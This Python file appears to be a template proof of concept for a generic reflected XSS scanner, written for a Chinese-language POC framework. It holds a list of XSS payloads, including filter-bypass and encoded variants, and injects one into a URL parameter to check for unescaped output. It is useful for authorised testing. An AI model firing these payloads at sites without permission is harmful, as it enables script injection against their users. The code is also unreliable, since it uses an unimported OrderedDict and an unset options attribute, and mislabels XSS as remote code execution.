#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import random
import string
#自动安装库的功能所需要的库
import subprocess
import sys
import importlib
class DemoPOC:
    appName = '通用Web应用'            # 漏洞影响的应用或组件名称
    appVersion = '所有版本'            # 漏洞影响版本
    install_requires = ['requests']   # 你可以在这里添加其他需要的库
    CVE_ID = "CVE-20XX-XXXX"         # CVE编号
    Vul_name = "跨站脚本攻击漏洞"       # 漏洞名称
    Type = "XSS"                     # 漏洞类型
    Description = "该漏洞允许攻击者在目标网站上注入恶意脚本代码，当用户访问页面时执行，可能导致会话劫持、钓鱼攻击等安全问题"  # 漏洞描述
    Script_type = "python"           # POC类型（暂时只支持python）
    Script = "xss_poc.py"            # POC文件名（包含后缀）
    Vul_Date = "2023-01-01"          # 漏洞公开日期

    def __init__(self, url, ip, port):
        self.url = url
        self.ip = ip
        self.port = port

    def random_str(self, length):
        """生成随机字符串"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))


    def check_and_install_dependencies(self):
        """检查并安装所需的库"""
        missing_packages = []
        for package in self.install_requires:
            try:
                importlib.import_module(package)
            except ImportError:
                missing_packages.append(package)

        if missing_packages:
            print(f"Missing packages: {missing_packages}. Installing...")
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", *missing_packages])
                print(f"Successfully installed: {missing_packages}")
            except subprocess.CalledProcessError as e:
                print(f"[ERROR] Failed to install required packages: {e}")
                return False
        return True

    # 所需用到的配置信息
    def _options(self):
        """定义POC运行时所需的选项"""
        o = OrderedDict()
        o['user'] = ''  # 支持认证的账号
        o['pwd'] = ''  # 支持认证的密码
        return o

    def get_option(self, key):
        """从options中获取选项值"""
        if key in self.options:
            return self.options[key]  # 返回选项的值
        else:
            raise KeyError(f"Option '{key}' not found in available options.")


    def _get_xss_payloads(self):
        """获取XSS payload示例"""
        # 生成一个随机标记，用于检测XSS成功与否
        marker = self.random_str(8)

        return [
            # 基础XSS payloads
            f"<script>alert('{marker}')</script>",
            f"<img src=x onerror=alert('{marker}')>",
            f"<svg onload=alert('{marker}')>",
            f"<body onload=alert('{marker}')>",

            # 引号逃逸型XSS
            f"\"><script>alert('{marker}')</script>",
            f"'><script>alert('{marker}')</script>",
            f"\"><img src=x onerror=alert('{marker}')>",

            # JavaScript事件型XSS
            f"javascript:alert('{marker}')",
            f"<a href=\"javascript:alert('{marker}')\">click me</a>",

            # 绕过过滤的XSS
            f"<scr<script>ipt>alert('{marker}')</script>",
            f"<ScRiPt>alert('{marker}')</sCrIpT>",
            f"<script>document.write('<img src=\"x\" onerror=\"alert(\'{marker}\')\"/>')</script>",

            # DOM XSS
            f"<iframe src=\"javascript:alert('{marker}')\"></iframe>",

            # 反射型XSS
            f"';alert('{marker}');//",
            f"\";alert('{marker}');//",

            # HTML5新特性型XSS
            f"<video><source onerror=\"javascript:alert('{marker}')\">",
            f"<details open ontoggle=alert('{marker}')>",

            # CSS注入型XSS
            f"<div style=\"background-image: url(javascript:alert('{marker}'))\">",

            # AngularJS或其他框架特有的XSS
            f"{{constructor.constructor('alert(\"{marker}\")')()}}",

            # 特殊字符编码型XSS
            f"<script>eval(String.fromCharCode(97,108,101,114,116,40,39,{marker},39,41))</script>"
        ]

    def _exploit(self, param='q'):
        """漏洞利用阶段，向目标发送请求并触发远程代码执行"""
        user = self.get_option('user')
        pwd = self.get_option('pwd')

        # 获取XSS payloads
        payloads = self._get_xss_payloads()

        # 默认使用第一个payload进行测试
        xss_payload = payloads[0]

        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36'}

        result = {}
        try:
            # 尝试GET请求注入
            if '?' in self.url:
                # URL已经有参数，添加或替换测试参数
                if f"{param}=" in self.url:
                    test_url = self.url.replace(f"{param}=", f"{param}={xss_payload}")
                else:
                    test_url = f"{self.url}&{param}={xss_payload}"
            else:
                # URL没有参数，添加测试参数
                test_url = f"{self.url}?{param}={xss_payload}"

            # 发送GET请求
            res = requests.get(test_url, headers=headers, timeout=10)
            result['ExploitResponse'] = res.text
            result['ExploitURL'] = test_url
            result['ExploitPayload'] = xss_payload

            return res.text

        except requests.RequestException as e:
            result['Error'] = f"[ERROR] Request failed: {e}"
            return result

    def _verify(self):
        """验证漏洞存在"""
        result = {}

        # 如果URL中有参数，提取第一个参数
        param = 'q'  # 默认参数名
        if '?' in self.url:
            query_string = self.url.split('?')[1]
            if '=' in query_string:
                param = query_string.split('=')[0]

        try:
            res = self._exploit(param)

            # 简单判断XSS漏洞是否存在
            # 检查响应中是否包含未转义的<script>标签或事件处理程序
            if isinstance(res, str):  # 确保res是字符串
                xss_indicators = [
                    "<script>alert(",
                    "onerror=alert(",
                    "onload=alert(",
                    "javascript:alert("
                ]

                if any(indicator in res for indicator in xss_indicators):
                    result['VerifyInfo'] = f"[!] Vulnerability found at {self.url}"
                    result['VulnParam'] = param
                else:
                    result['VerifyInfo'] = "[SAFE] No vulnerability found."
            else:
                result['VerifyInfo'] = "[SAFE] No vulnerability found."
        except Exception as e:
            result['Error'] = f"[ERROR] Error during verification: {e}"

        return result


# 使用示例
if __name__ == '__main__':
    url = 'http://example.com/vulnerable_endpoint'
    poc = DemoPOC(url, '', '')

    # 验证漏洞
    verify_result = poc._verify()
    print(verify_result)